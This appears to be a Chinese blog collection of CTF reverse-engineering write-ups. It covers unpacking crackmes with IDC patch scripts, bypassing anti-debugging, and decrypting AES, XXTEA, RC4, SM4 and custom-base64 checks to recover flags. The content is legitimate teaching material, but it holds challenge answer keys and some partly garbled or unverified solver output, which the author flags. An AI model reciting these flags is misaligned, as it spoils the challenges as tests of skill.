跟进SquareRevealedCallback函数，可以发现前面的if语句中输出了结束信息以及程序结束的函数，那么后面的getkey函数就是输出我们flag的函数 123456789101112131415161718192021222324// Token: 0x0600000D RID: 13 RVA: 0x000023E4 File Offset: 0x000005E4 private string GetKey(List&lt;uint&gt; revealedCells) { revealedCells.Sort(); Random random = new Random(Convert.ToInt32((revealedCells[0] &lt;&lt; 20) | (revealedCells[1] &lt;&lt; 10) | revealedCells[2])); byte[] array = new byte[32]; byte[] array2 = new byte[] { 245, 75, 65, 142, 68, 71, 100, 185, 74, 127, 62, 130, 231, 129, 254, 243, 28, 58, 103, 179, 60, 91, 195, 215, 102, 145, 154, 27, 57, 231, 241, 86 }; random.NextBytes(array); uint num = 0U; while ((ulong)num &lt; (ulong)((long)array2.Length)) { byte[] array3 = array2; uint num2 = num; array3[(int)num2] = array3[(int)num2] ^ array[(int)num]; num += 1U; } return Encoding.ASCII.GetString(array2); } 我们将SquareRevealedCallback函数中的if语句注释掉，就不会弹出失败信息了，右键，编辑方法。 接着是将文件保存，ctrl+shift+s，选择一个目录保存 然后打开文件，找到关键点 后面一次点击这3个点，就可以成功输出flag flag{Ch3aters_Alw4ys_W1n@flare-on.com} 参考 [网鼎杯 2020 青龙组]jocker [混淆+动调]又遇到了混淆题…… 一眼就看出来前面的是假把戏，只有最后的encrypt才是真正的加密函数，还进行了混淆。 上idc代码： 12345678#include &lt;idc.idc&gt;static main(){ auto addr = 0x401500; auto i; for(i = 0;i &lt;= 186;i++){ PatchByte((addr+i),(addr+i)^0x41); }} 在运行idc代码之后，修改一下函数，再跳过for循环，应用补丁，删除ida数据库，重新加载后，呈现出来的mian函数就是这样： 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp){ char Str[50]; // [esp+12h] [ebp-96h] BYREF char Destination[80]; // [esp+44h] [ebp-64h] BYREF DWORD flOldProtect; // [esp+94h] [ebp-14h] BYREF size_t v7; // [esp+98h] [ebp-10h] int v8; // [esp+9Ch] [ebp-Ch] __main(); puts(&quot;please input you flag:&quot;); if ( !VirtualProtect(encrypt, 0xC8u, 4u, &amp;flOldProtect) ) exit(1); scanf(&quot;%40s&quot;, Str); v7 = strlen(Str); if ( v7 != 24 ) { puts(&quot;Wrong!&quot;); exit(0); } strcpy(Destination, Str); wrong(Str); omg(Str); v8 = 0; if ( encrypt(Destination) ) finally(Destination); return 0;} 再稍微修改一下encrypt函数，以及函数的范围 1234567891011121314151617181920int __cdecl encrypt(char *a1){ int v2[19]; // [esp+1Ch] [ebp-6Ch] BYREF int v3; // [esp+68h] [ebp-20h] int i; // [esp+6Ch] [ebp-1Ch] v3 = 1; qmemcpy(v2, &amp;unk_403040, sizeof(v2)); for ( i = 0; i &lt;= 18; ++i ) { if ( (char)(a1[i] ^ aHahahahaDoYouF[i]) != v2[i] ) { puts(&quot;wrong ~&quot;); v3 = 0; exit(0); } } puts(&quot;come here&quot;); return v3;} 还有finally函数： 1234567891011121314151617int __cdecl finally(char *a1){ unsigned int v1; // eax char v3[9]; // [esp+13h] [ebp-15h] BYREF int v4; // [esp+1Ch] [ebp-Ch] strcpy(v3, &quot;%tp&amp;:&quot;); v1 = time(0); srand(v1); v4 = rand() % 100; v3[6] = 0; *(_WORD *)&amp;v3[7] = 0; if ( (v3[(unsigned __int8)v3[5]] != a1[(unsigned __int8)v3[5]]) == v4 ) return puts(&quot;Really??? Did you find it?OMG!!!&quot;); else return puts(&quot;I hide the last part, you will not succeed!!!&quot;);} 分析一下encrypt函数 input与ahh异或之后需要等于v2，动调一下v2 123456v2 = [0xe,0xd,0x9,0x6,0x13,0x5,0x58, 0x56, 0x3e, 0x06,0xc, 0x3c, 0x1f, 0x57, 0x14, 0x6b, 0x57, 0x59, 0xd]ahh = &quot;hahahaha_do_you_find_me?&quot;arr = []for i in range(len(v2)): arr.append(ord(ahh[i])^v2[i])# flag{d07abccf8a410c encrypt函数只能求出前19位，还有最后5位是在finally函数中 v3字符串是”%tp&amp;:”，我们唯一可以确定的是最后一位是”}”，可以算出同一加密的key是多少 123456789101112131415v2 = [0xe,0xd,0x9,0x6,0x13,0x5,0x58, 0x56, 0x3e, 0x06,0xc, 0x3c, 0x1f, 0x57, 0x14, 0x6b, 0x57, 0x59, 0xd]ahh = &quot;hahahaha_do_you_find_me?&quot;arr = []for i in range(len(v2)): arr.append(ord(ahh[i])^v2[i])# flag{d07abccf8a410cs = &quot;%tp&amp;:&quot;key = ord(&quot;:&quot;)^ord(&quot;}&quot;)#71for i in s: arr.append(ord(i)^71)flag = &quot;&quot;.join([chr(i) for i in arr])#flag{d07abccf8a410cb37a} [GWCTF 2019]re3 (混淆+动调+AES)findcrypt查看加密 再查看字符串，跟进成功的字符串 发现已被混淆 跟进此处，发现这是个函数，下面还调用了 查看反汇编窗口： 这些数据其实是代码，经过异或之后，变成代码执行 shift+F2 调用idc 12345678#include &lt;idc.idc&gt;static main(){auto addr = 0x402219;auto i;for(i = 0;i&lt;223;i++){ PatchByte(addr+i,Byte(addr+i)^0x99); }} 选中修改后的数据，按c，force,转换成代码， xuanzsub_402219函数，修改函数的范围 tab键查看反汇编 我们再修改一下main函数的值 注意,修改完成之后，需要patch一下源程序，然后把ida数据库文件删除后，再用ida重新打开。而且在调试的时候，需要跳过中间的混淆函数 反汇编函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(int a1, char **a2, char **a3){ int i; // [rsp+8h] [rbp-48h] char s[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); __isoc99_scanf(&quot;%39s&quot;, s); if ( (unsigned int)strlen(s) != 32 ) { puts(&quot;Wrong!&quot;); exit(0); } mprotect(&amp;dword_400000, 0xF000uLL, 7); for ( i = 0; i &lt;= 223; ++i ) *((_BYTE *)sub_402219 + i) ^= 0x99u; sub_40207B(&amp;unk_603170); if ( (unsigned int)sub_402219(s) ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); exit(0);} 参考链接： 从后往前分析： 跟进最后的sub_402219函数， 12345678910111213141516171819__int64 __fastcall sub_402219(__int64 a1){ unsigned int v2; // [rsp+18h] [rbp-D8h] int i; // [rsp+1Ch] [rbp-D4h] char v4[200]; // [rsp+20h] [rbp-D0h] BYREF unsigned __int64 v5; // [rsp+E8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_400A71(v4, &amp;unk_603170); sub_40196E(v4, a1); sub_40196E(v4, a1 + 16); v2 = 1; for ( i = 0; i &lt;= 31; ++i ) { if ( *(_BYTE *)(i + a1) != byte_6030A0[i] ) v2 = 0; } return v2;} sub_40196E是AES加密，sub_400A71是生成轮密钥，最后对比的byte_6030A0的值可以动调出来： 1byte_6030A0 = 0xBC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B 现在我们需要知道作为轮密钥的unk_603170的值 分析sub_402219上面的sub_40207B函数 sub_401CF9函数，将base64的表传入，赋值给v2 最下面的一个函数sub_401CF9，传入参数unk_603170和v2 动调unk_603170的值。sub_402219中，unk_603170作为二参传入sub_400A71函数中 分析其反汇编，因为参数传递是从右往左传递，通过ida动调，就能得知unk_603170 shift+e数据提取 1unk_603170 = 0xcb8d493521b47a4cc1ae7e62229266ce Base64表经过sub_40207B函数两次加密，传入unk_603170 使用unk_603170作为轮回密钥，进行AES加密 结果与byte_6030A0比较 代码参考： 1234567from Crypto.Cipher import AESfrom Crypto.Util.number import *key = long_to_bytes(0xcb8d493521b47a4cc1ae7e62229266ce)crypto = long_to_bytes(0xbc0aadc0147c5ecce0b140bc9c51d52b46b2b9434de5324bad7fb4b39cdb4b5b)lun = AES.new(key, mode=AES.MODE_ECB)flag = lun.decrypt(crypto)print(flag) [RCTF2019]DontEatMe迷宫题： [红帽杯2019] xx上来先用findcrypt插件识别一下加密算法 先是判断输入字符串长度是否等于19 动调后可以看出，xxtea加密上面的代码，就是把输入字符串第四个后面的所有元素赋值为0，并把这四个字符作为二参，作为密钥，进入到xxtea加密算法中 1234四参:&quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot;字符串地址三参:0x13二参:0x00000001000FF998 地址一参:0x00000001000FF9B0 然后是对xxtea加密后的算法进行混淆 然后是进行异或操作： 最后是进行对比 正向： —-&gt;输入字符串（19位） —-&gt;取前面输入的前4位作为xxtea算法密钥 —-&gt;xxtea算法加密 —-&gt;加密字符串后进行打乱置换 —-&gt;对打乱之后的数组进行异或 —-&gt;对比16进制数组 逆向： —-&gt;得到最后对比的16进制数组 —-&gt;异或 —-&gt;恢复置换 —-&gt;xxtea解密 —-&gt;得到输入字符串 因为是小端序，最后对比的16进制数组应该是： 1data =[0xCE,0xBC,0x40,0x6B,0x7C,0x3A,0x95,0xC0,0xEF,0x9B,0x20,0x20,0x91,0xF7,0x02,0x35,0x23,0x18,0x02,0xC8,0xE7,0x56,0x56,0xFA] 动调了一下异或，发现第一次和第二次都没有异或，第三次才异或，而且越往后，内层异或次数越多。i在外层递增遍历数组v20，i/3的值越大，内层v20[j]与v20[i]的异或次数i/3越多。下面是c的正向伪代码： 123456789101112for ( i = 1; i &lt; 24; ++i ) { j = 0; if ( i / 3 &gt; 0 ) { do { v20[i] ^= v20[j++]; } while ( j &lt; i / 3 ); } } 下面是逆向的python代码： 123for i in range(len(data)-1,-1,-1): for j in range(i//3): data[i] ^= data[j] 数组置换代码： 12345table = {0:2,1:0,2:3,3:1,4:6,5:4,6:7,7:5,8:10,9:8,10:11,11:9,12:14,13:12,14:15,15:13,16:18,17:16,18:19,19:17,20:22,21:20,22:23,23:21}data1 = [0]*len(table)for i in range(len(table)): data1[table[i]] = data[i] 1data1 = [0xbc, 0xa5, 0xce, 0x40, 0xf4, 0xb2, 0xb2, 0xe7, 0xa9, 0x12, 0x9d, 0x12, 0xae, 0x10, 0xc8, 0x5b, 0x3d, 0xd7, 0x6, 0x1d, 0xdc, 0x70, 0xf8, 0xdc] xxtea 加密 python2代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import struct _DELTA = 0x9E3779B9 def _long2str(v, w): n = (len(v) - 1) &lt;&lt; 2 if w: m = v[-1] if (m &lt; n - 3) or (m &gt; n): return '' n = m s = struct.pack('&lt;%iL' % len(v), *v) return s[0:n] if w else s def _str2long(s, w): n = len(s) m = (4 - (n &amp; 3) &amp; 3) + n s = s.ljust(m, &quot;\\0&quot;) v = list(struct.unpack('&lt;%iL' % (m &gt;&gt; 2), s)) if w: v.append(n) return v def encrypt(str, key): if str == '': return str v = _str2long(str, True) k = _str2long(key.ljust(16, &quot;\\0&quot;), False) n = len(v) - 1 z = v[n] y = v[0] sum = 0 q = 6 + 52 // (n + 1) while q &gt; 0: sum = (sum + _DELTA) &amp; 0xffffffff e = sum &gt;&gt; 2 &amp; 3 for p in xrange(n): y = v[p + 1] v[p] = (v[p] + ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[p &amp; 3 ^ e] ^ z))) &amp; 0xffffffff z = v[p] y = v[0] v[n] = (v[n] + ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[n &amp; 3 ^ e] ^ z))) &amp; 0xffffffff z = v[n] q -= 1 return _long2str(v, False) def decrypt(str, key): if str == '': return str v = _str2long(str, False) k = _str2long(key.ljust(16, &quot;\\0&quot;), False) n = len(v) - 1 z = v[n] y = v[0] q = 6 + 52 // (n + 1) sum = (q * _DELTA) &amp; 0xffffffff while (sum != 0): e = sum &gt;&gt; 2 &amp; 3 for p in xrange(n, 0, -1): z = v[p - 1] v[p] = (v[p] - ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[p &amp; 3 ^ e] ^ z))) &amp; 0xffffffff y = v[p] z = v[n] v[0] = (v[0] - ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[0 &amp; 3 ^ e] ^ z))) &amp; 0xffffffff y = v[0] sum = (sum - _DELTA) &amp; 0xffffffff return _long2str(v, True)if __name__ == &quot;__main__&quot;: key = &quot;flag&quot; data1 = [0xbc,0xa5,0xce,0x40,0xf4,0xb2,0xb2,0xe7,0xa9,0x12,0x9d,0x12,0xae,0x10,0xc8,0x5b,0x3d,0xd7,0x6,0x1d,0xdc,0x70,0xf8,0xdc] s = &quot;&quot;.join(map(chr, data1)) s = decrypt(s, key) print(repr(s)) # flag = b'flag{CXX_and_++tea}' # flag = encrypt(flag,key) # print(flag) [虎符2022 未完] fpbe查看官方wp，发现使用的是另一款基于java的反汇编器：Ghidra 插件也下载好了，就是不会安装……没有在file下面找到extension [GUET CTF2019] encrypt RC4/elf动调/base64分块写在前面：关于elf的动调 把ida目录下dbgsrv的两个linux_server拖到linux需要调试的文件的文件夹中 运行相关格式的linux_server 返回ida中，选择remote linux debugger，F9，选择相应配置 在程序开始的地方打上断点，按F9，就可以动调了（操作与其他动调工具一致） 这道题是关于RC4的加密算法 算法共有三个步骤 S列表和T向量的初始值，同时建立一个临时变量T，将密钥的值循环赋值到T数组中 S的初始置换 生成密码流 查看main函数 题目中给出了密钥v10数组，并作为二参进入了函数sub_4006B6 跟进sub_4006B6函数，其融合了RC4加密算法的第一二步骤 将v9（以下统称S）数组中元素的值按升序置为0-255，题目中没有明显的赋值T向量，但效果一致 接下来就是swap()，打乱S数组了 展示一下打乱前和打乱后的S数组（大可不必） 打乱前： 打乱后： 跟进sub_4007DB函数，与RC4有所出入的是生成的 k（v9[(v7 + v8)]）直接与明文（s）异或了 正向：s –&gt; k ​ k ^ 明文 ==&gt; 密文 逆向：密文 ^ k ==&gt; 明文 所以我们只需要求等式右边的k值，与密文异或，就能求出明文了（很多wp上来就是求数组S，说实话没啥用，因为k就是通过S生成的，S则是通过递增数组和密钥T数组生成的，当然也是可以求出来的） 动调elf文件，跟进sub_4007D8函数，光标放在22行，查看反汇编界面，rdx是异或之前的数，在其处下断点，一直F9，将k数组统计出来 1k = [0x10,0x59,0x9C,0x92,0x06,0x22,0xCF,0xA5,0x72,0x1E,0x45,0x6A,0x06,0xCB,0x08,0xC3,0xE4,0x49,0x5A,0x63,0x0C,0xDF,0xF6,0x5F,0x08,0x28,0xBD,0xE2,0x10,0x15,0x1F,0x6E,0xAA,0x5A,0xCA,0xEC,0x80,0xAF,0x9B,0x16,0xBB,0x3D,0x13,0x2F,0x6A,0xA4,0xC7,0x2E,0xBC,0x4B,0x60,0x9A,0xAF,0xE9,0xCE,0xDA,0x67,0x39,0xBA,0x3B,0x85,0xEB,0xD2,0x6B,0xAB,0x06,0x6B,0x10,0x57,0x2C,0x88,0x70,0xF7,0x4F,0xAA,0x7F,0x12,0x47,0xD6,0xDE,0x74,0xB2,0x1D,0xA4,0xD7,0x76,0x9A,0xE0] 现在我们需要求的是密文，我们跟进下面的函数 这边很眼熟，在base64加密中看见过，将3位字符，转换成4位字符 正向：rc4加密后的字符每4位转换成3位 逆向：最后对比的byte_602080字符，每3位转换成4位 shift+e数据提取（漏了一位，记得手动添上） 脚本参考 123456789101112131415data = [0x5a, 0x60, 0x54, 0x7A, 0x7A, 0x54, 0x72, 0x44,0x7C, 0x66, 0x51, 0x50, 0x5B, 0x5F, 0x56, 0x56,0x4C, 0x7C, 0x79, 0x6E, 0x65, 0x55, 0x52, 0x79,0x55, 0x6D, 0x46, 0x6B, 0x6C, 0x56, 0x4A, 0x67,0x4C, 0x61, 0x73, 0x4A, 0x72, 0x6F, 0x5A, 0x70,0x48, 0x52, 0x78, 0x49, 0x55, 0x6C, 0x48, 0x5C,0x76, 0x5A, 0x45, 0x3D]string = ''for i in range(0,len(data),4): string += chr((((data[i]-0x3D)&amp;0x3F)&lt;&lt;2)|(((data[i+1]-0x3D)&amp;0x30)&gt;&gt;4)) string += chr((((data[i+1]-0x3D)&amp;0x0F)&lt;&lt;4)|(((data[i+2]-0x3D)&amp;0x3C)&gt;&gt;2)) string += chr(((data[i+3]-0x3D)&amp;0x3F)|((data[i+2]-0x3D)&amp;0x03)&lt;&lt;6)k = [0x10,0x59,0x9C,0x92,0x06,0x22,0xCF,0xA5,0x72,0x1E,0x45,0x6A,0x06,0xCB,0x08,0xC3,0xE4,0x49,0x5A,0x63,0x0C,0xDF,0xF6,0x5F,0x08,0x28,0xBD,0xE2,0x10,0x15,0x1F,0x6E,0xAA,0x5A,0xCA,0xEC,0x80,0xAF,0x9B,0x16,0xBB,0x3D,0x13,0x2F,0x6A,0xA4,0xC7,0x2E,0xBC,0x4B,0x60,0x9A,0xAF,0xE9,0xCE,0xDA,0x67,0x39,0xBA,0x3B,0x85,0xEB,0xD2,0x6B,0xAB,0x06,0x6B,0x10,0x57,0x2C,0x88,0x70,0xF7,0x4F,0xAA,0x7F,0x12,0x47,0xD6,0xDE,0x74,0xB2,0x1D,0xA4,0xD7,0x76,0x9A,0xE0]arr = list(string)flag=''for i in range(len(arr)): flag += chr(ord(arr[i])^k[i])print(flag) 太强了……改天得研究一下这个脚本是怎么写的 [HDCTF] MFC (Win消息发送+DES加密)刚开始用的火绒剑，感觉没啥用 去下了个spy类工具，用来查看windows的窗口，消息和进程等等 这边用的是大佬推荐的CometAssistant，彗星小助手 还去下载了一个spy++ (但是看着有点膈应人) 关于xspy的使用很简单，只需要把这个放大镜拖动放到需要嗅探的窗口中就可以了 突破口在这边，当然也涉及我的知识盲区了：向窗口发送信息 这边直接把大佬博客里的代码贴过来： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ HWND h = ::FindWindowA(NULL, &quot;Flag就在控件里&quot;); if (h) { SendMessage(h, 0x464, NULL, NULL); } else{ printf(&quot;false&quot;); } system(&quot;pause&quot;); return 0;} 分析一下： 首先Win32 API的使用需要导入Windows.h的库 FindWindowA:检索其类名和窗口名与指定字符串匹配的顶级窗口的句柄。此函数不搜索子窗口。此函数不执行区分大小写的搜索。返回值是一个窗口句柄。一参是窗口的类名，可为空。二参是窗口的标题名称。 SendMessage:将指定的消息发送到一个或多个窗口。SendMessage函数调用指定窗口的窗口过程，直到窗口过程处理完消息后才返回。 贴上详细解释，长话短说就是一参是接受窗口的句柄，二参是指定被发送的消息，三四参数是附加消息指定信息。 这个窗口的窗口名称为“Flag就在控件中”，我们就去寻找这个窗口的句柄，并赋值为h。 找到句柄之后我们向其发送一个数字：0x464（至于为什么要发送0x464，还得让我琢磨琢磨……） 当发送完数字之后，窗口变了 DES是一个常见的分组加密形式，需要一个密钥+明文==&gt;明文 貌似这个名字就是明文了 12crypto: 944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1bkey: {I am a Des key} flag{thIs_Is_real_kEy_hahaaa} [CISCN2018]2ex (base64换表)啊这…… 放到ida中，这个字符很起疑心： 长度竟然为64？base64换表走起： 12345678910111213import base64string = &quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;new_base = &quot;@,.1fgvw#`/2ehux$~\\&quot;3dity%_;4cjsz^+{5bkrA&amp;=}6alqB*-[70mpC()]89noD&quot;base = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag = base64.b64decode(string.translate(str.maketrans(new_base,base)))print(flag)#b'flag{change53233})' CTFtools也成，得把表中的转义字符\\给去掉才行 （太棒了，水了一题） [安洵杯 2019]crackMe (SM4+base64魔改+hook) 搞不懂为什么我运行不起来，修复了半天，去装了个win7 运行之后，应该是这样的界面： 猜测这道题的考点是hook 正向： ——–&gt;base64表大小写转换 ——–&gt;SM4加密（key = “where_are_you_now?”） ——–&gt;SM4加密后，密码相邻位互换 ——–&gt;base64表，先进行大小写转换，再进行（a1+24）%64转换[相当于把字母表向左移动了24位] ——–&gt;base64解密 逆向 ——–&gt;base64表转换（大小写与移位） ——–&gt;加密字符转换（相邻位置互换） ——–&gt;base64换表解密 ——–&gt;SM4解密（需要pysm4的包） 这道base64是用”!”，来替换’=’ ，先来转换base64的表： 123456789base = list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;)for i in range(64): # base[i] = base[i].swapcase()print(''.join(base))new_base = [base[(i+24)%64] for i in range(len(base))]print(''.join(new_base))# new_base = yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx 再把需要转换的字符两两转换，换表base64解码 1234567891011121314151617181920import base64base = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;new_base = &quot;yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx&quot;raw_string = list(&quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;.replace(&quot;!&quot;,&quot;=&quot;))# 1UTAOIkpyOSWGv/mOYFY4R==for i in range(0,len(raw_string),2): raw_string[i],raw_string[i+1] = raw_string[i+1],raw_string[i]# U1ATIOpkOyWSvGm/YOYFR4==string = &quot;&quot;.join(raw_string)s = base64.b64decode(string.translate(str.maketrans(new_base,base)))print(list(s))# [89, 208, 149, 41, 13, 242, 64, 6, 20, 244, 141, 39, 105, 6, 135, 78]# 字符串转换成16进制hex_s = binascii.b2a_hex(s)print(hex_s)# b'59d095290df2400614f48d276906874e' 然后把生成的两个16进制数:需要解密的数hex_key以及轮回秘钥hex_s，放到SM4解密函数decode()中解密，将生成的Int类型数字，转换成16进制，再转换成bytes类型 1234567891011121314151617import binasciifrom pysm4 import encrypt,decryptkey = &quot;where_are_u_now?&quot;hex_key = hex(binascii.b2a_hex(key.encode('utf-8')))# b'77686572655f6172655f755f6e6f773f'hex_s = 0x59d095290df2400614f48d276906874ehex_key = 0x77686572655f6172655f755f6e6f773fclear_num = decrypt(cipher_num, mk)# clear_num = 110726793309279461591673877471154814753# 将生成的int型结果转换成16进制字符串# 再将16进制字符串去除头两位，转换成bytes类型# 最后再将bytes类型编码print('flag{'+bytes.fromhex(hex(clear_num)[2:]).decode()+'}')# flag{SM4foRExcepioN?!} 参考链接：http://81.69.232.121/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019crackme-%E6%88%91%E4%BA%BA%E5%82%BB%E4%BA%86/ [WUSTCTF2020]level4 (idc or 算法)没想到这题竟然有三种解法，之前写这篇的时候，没有深入的研究： ida打开: 123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp){ puts(&quot;Practice my Data Structure code.....&quot;); puts(&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;); init(&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;, argv); puts(&quot;Traversal!&quot;); printf(&quot;Traversal type 1:&quot;); type1(&amp;unk_601290); printf(&quot;\\nTraversal type 2:&quot;); type2(&amp;unk_601290); printf(&quot;\\nTraversal type 3:&quot;); puts(&quot; //type3(&amp;x[22]); No way!&quot;); puts(&amp;byte_400A37); return 0;} 跟进type1： 1234567891011__int64 __fastcall type1(char *a1){ __int64 result; // rax if ( a1 ) { type1(*((_QWORD *)a1 + 1)); putchar(*a1); return type1(*((_QWORD *)a1 + 2)); } return result; 跟进type2: 1234567891011int __fastcall type2(char *a1){ int result; // eax if ( a1 ) { type2(*((_QWORD *)a1 + 1)); type2(*((_QWORD *)a1 + 2)); return putchar(*a1); } return result; 两个递归调用，可以确定type1是中序遍历二叉树，type2是后序遍历二叉树，我们需要做的就是通过type1,type2，我们可以尝试还原出二叉树的构造。 方法一：手算，如果二叉树太大，耗时耗力。 方法二：可以猜测出flag应为前序遍历，使用idc脚本编写 跟进type2，查看反汇编代码，发现只需要调整代码块的位置，就使type2函数变成前序遍历 123456789101112131415161718192021222324static main(){ auto address1=0x4007CA; auto address2=0x4007EA; auto address3=0x4007FB; auto code1=&quot;&quot;; auto i=0,j=0; for(i=address1;i&lt;address2;i++) { code1=code1+Byte(i); } j=address1; for(i=address2;i&lt;address3;i++) { PatchByte(j++,Byte(i)); } for(i=0;i&lt;strlen(code1);i++) { PatchByte(j++,ord(code1[i])); }} 在计算机中，汇编指令和数据其实都是一码事，都是二进制代码，为了方便使用的是16进制数，一个字节8位，使用的是两个十六进制数。Byte是根据给出的虚拟地址，取一个字节，PatchByte则是用二参的字节去patch一参的地址。 idc代码就是把address1-address2处的字节与address2-address3的字节交换 可以在这边输入6，可以看到指令的字节 选中代码，右键分析，强制执行之后： 改变前： 改变后： 别的大佬的博客用的都是keypatch插件，我是直接把对应地址的call指令重新patch了 最后，把patch完的程序，apply patches to应用 出来了： 方法三：上手C++代码 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;char post[] = &quot;20f0Th{2tsIS_icArE}e7__w&quot;; // 后序遍历结果char mid[] = &quot;2f0t02T{hcsiI_SwA__r7Ee}&quot;; // 中序遍历结果void pre(int root, int start, int end){ if (start &gt; end) return; int i = start; while (i &lt; end &amp;&amp; mid[i] != post[root]) i++; //定位根在中序的位置 cout &lt;&lt; mid[i]; //访问当前处理的树的根 pre(root - 1 - (end - i), start, i - 1); //递归处理左子树 pre(root - 1, i + 1, end); //递归处理右子树 }int main(){ pre(24, 0, 24); return 0;}#flag{This_IS_A_7reE} 感谢师傅送我的代码！！ [CFI-CTF 2018]IntroToPE (.NET逆向)打开看一下： 查个壳，这让我有点害怕，第一次遇到带红的 12Big sec. 1 .text , Explore and analyze .NET assemblies with .NET Reflector v10 - www.red-gate.com - IF file is packed try .NET Generic unpacker : www.quequero.org/Pack_Unpack 还去下载了.net Reflector 和 .NET Generic unpacker 我们直接用dnSpy打开， 找到对应的函数 热泪盈眶 [GXYCTF2019]simple CPP (z3+反调试+动调)这题折磨的我没有脾气…… 先查个壳，C++逆向，据我所知，c++的题目，一般都得调试…… 瞧瞧这是人看的题目么 main函数中，还出现了反调试函数，调试会崩，需要打补丁。我用ida调试了很久，太菜，无果…… 题目的意思是将输入的字符转换成16进制字符串，假设输入abc，则字符串为616263 我们需要求出v20数组 用x,y,z,w分别代表v20[0]~v20[3]，还是耐住性子写了一遍本题的位运算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960v20[3] = wv20[2] = zv20[1] = yv20[0] = xv41 = v20[2] = zv21 = v20[1] = yv22 = v20[0] = xv24 = v21 &amp; v22 = x &amp; yv25 = z &amp; ~x = 0x11204161012v26 = ~v21 = ~yv27 = v41 &amp; v26 = z &amp; ~yv28 = x &amp; ~yv23[0] = v21 &amp; v22 = x &amp; yv23[1] = v25 = z &amp; ~x = v23[2] = v41 &amp; v26 = z &amp; ~yv23[3] = v28 = x &amp; ~yv29 = v25 | v24 | v27 | v28 = (z &amp; ~x)|(x &amp; y)|(z &amp; ~y)|(x &amp; ~y)v30 = yv31 = zv32 = v27 &amp; *v20 | v31 &amp; (v24 | v30 &amp; ~*v20 | ~(v30 | *v20)) ==&gt; (z &amp; ~y) &amp; x | z &amp; (x &amp; y | y &amp; ~(x)) | ~(y | x) ==&gt; 0x8020717153E3013v33 = v29 ==&gt; (z &amp; ~x)|(x &amp; y)|(z &amp; ~y)|(x &amp; ~y) ==&gt; 0x3E3A4717373E7F1F(v29 ^ v20[3]) == 0x3E3A4717050F791F==&gt; ((z &amp; ~x)|(x &amp; y)|(z &amp; ~y)|(x &amp; ~y)）^ w v3 = v33 (v25 | v24 | v30 &amp; v31) == (~v20[0] &amp; v31 | 0xC00020130082C0Ci64) &amp;&amp; v33==&gt; 0x11204161012 | (x &amp; y) | (y &amp; z) == ((~x &amp; z) | 0xC00020130082C0C) &amp;&amp; 0x3E3A4717373E7F1F 在Z3中，只有BitVecs可以进行位运算 12345678910111213141516171819202122232425262728# -*- coding:utf-8 -*-from z3 import *x,y,z,w=BitVecs('x y z w',64)s=Solver()s.add(z &amp; ~x == 0x11204161012)s.add(((z &amp; ~y) &amp; x | z &amp; (x &amp; y | y &amp; ~(x)) | ~(y | x)) == 0x8020717153E3013)s.add(((z &amp; ~x)|(x &amp; y)|(z &amp; ~y)|(x &amp; ~y)) == 0x3E3A4717373E7F1F)s.add(0x11204161012 | (x &amp; y) | (y &amp; z) == ((~x &amp; z) | 0xC00020130082C0C))s.add((((z &amp; ~x)|(x &amp; y)|(z &amp; ~y)|(x &amp; ~y))^ w ) == 0x3E3A4717050F791F)s.check()m = s.model()for i in m: print(&quot;%s = 0x%x&quot;%(i,m[i].as_long()))y = 0xcdc5bae9f8c9acecx = 0x3e3a460533286f0dw = 0x32310600z = 0x8020717153e3013 然而我的代码和大佬的代码运行结果只有一个变量不一致…… 1234y = 0xc00020130082c0cx = 0x3e3a460533286f0dw = 0x32310600z = 0x8020717153e3013 在动调中发现了这些字符 下面的代码是大佬的代码，我实在没有搞懂lis中0x8c之后的十六进制数是哪里来的…… 1234567flag = ''lis = [0x3E,0x3A,0x46,0x05,0x33,0x28,0x6F,0x0D,0x8C,0x00,0x8A,0x09,0x78,0x49,0x2C,0xAC,0x08,0x02,0x07,0x17,0x15,0x3E,0x30,0x13,0x32,0x31,0x06]string = 'i_will_check_is_debug_or_noi_wil'for i in range(len(lis)): flag += chr(lis[i] ^ ord(string[i]))print(flag) We1l_D0näeéb’ _ólgebra_am_i 第二部分的解，比赛的时候已经给出e!P0or_a 所以flag{We1l_D0ne!P0or_algebra_am_i} 参考链接：https://blog.csdn.net/mcmuyanga/article/details/113628506 [FlareOn1]Bob Doge （.net逆向+dnspy逆向） 先查个壳，发现没有壳，c++编写 运行一下，发现是个安装的程序 